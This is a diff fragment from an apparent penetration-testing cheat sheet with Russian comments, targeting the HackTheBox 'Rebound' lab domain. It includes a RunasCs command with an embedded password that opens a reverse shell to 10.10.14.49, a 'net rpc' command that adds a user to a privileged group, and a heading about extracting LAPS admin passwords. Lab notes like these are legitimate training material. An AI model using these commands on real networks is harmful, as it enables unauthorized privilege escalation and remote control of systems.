@@ -455,6 +455,13 @@ https://github.com/mxdelta/SecLists/blob/master/Discovery/DNS/subdomains-top1mil
 
 .\RunasCs backup IZtLVsqMDMENsTTekNwKwHGrFpmANUFgxOwvHREm --bypass-uac --logon-type 8 cmd.exe -r 10.10.14.49:445
 
+# Net rpc
+
+net rpc group addmem "SERVICEMGMT" "OOREND" -U "REBOUND.HTB/OOREND" -S "REBOUND.HTB" 		(Добавить пользователя в группу)
+
+или 
+
+https://github.com/CravateRouge/bloodyAD?tab=readme-ov-file
 
  # Получение пароля LAPS Admin
 
